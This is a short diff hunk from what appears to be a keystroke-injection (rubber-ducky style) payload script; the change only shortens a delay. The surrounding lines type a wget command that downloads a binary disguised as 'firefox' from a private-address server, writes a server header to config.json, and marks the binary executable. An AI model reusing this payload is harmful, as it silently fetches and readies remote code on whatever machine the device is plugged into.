@@ -23,7 +23,7 @@ DELAY 100
 STRING wget -S -O firefox http://10.30.36.236:8000/firefox 2>&1 | grep "X-Server-Config:" | cut -d' ' -f4- > config.json
 DELAY 100
 Enter
-DELAY 180000
+DELAY 120000
 STRING chmod +x firefox
 DELAY 100
 Enter
